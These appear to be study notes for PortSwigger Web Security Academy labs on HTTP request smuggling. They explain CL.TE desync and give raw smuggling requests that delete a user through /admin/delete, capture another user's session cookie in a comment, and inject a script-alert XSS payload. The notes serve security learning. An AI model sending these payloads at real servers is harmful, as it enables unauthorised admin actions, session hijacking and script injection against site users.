Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:

`POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked 0 SMUGGLED`

The front-end server processes the `Content-Length` header and determines that the request body is 13 bytes long, up to the end of `SMUGGLED`. This request is forwarded on to the back-end server.

The back-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

To Confirm there is a vul, try this request

POST / HTTP/1.1
Host: 0ae000f804a8bda48041083f002100ee.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0


GET /404 HTTP/1.1
X-Ignore: X

Example

POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G

Another Example:

In this example we delete carlos user using 2 request, the first one is using to generar the smuggling and the second one execute it

#1
POST / HTTP/1.1
Host: 0ac800fa042549e383cb965a003900e6.web-security-academy.net
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Transfer-Encoding: chunked

3
abc
0

GET /admin/delete?username=carlos HTTP/1.1
Host:localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

x=

#2
POST / HTTP/1.1
Host: 0ac800fa042549e383cb965a003900e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

Example 3 (Steal Session cookie in a post comment):
Auto update the first content length and the second one try to guess how much bytes do you need to get the session token
POST / HTTP/1.1
Host: 0a8c0043039ef000801db272007400af.web-security-academy.net
Content-Length: 252
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Length: 930
Content-Type: application/x-www-form-urlencoded
Cookie: session=OWUFya6X57wYJGqtMsHDQKaNiKRCS2Zi

csrf=oTyupYLYgnXccT1yTW3UkvjMHVAMRAZd&postId=8&name=test&email=a%40a.com&website=&comment=test+2

Example 4: XSS
Auto Update has the other examples
POST / HTTP/1.1
Host: 0a44008e032216da805617cc00bf0005.web-security-academy.net
Content-Length: 150
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=1 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1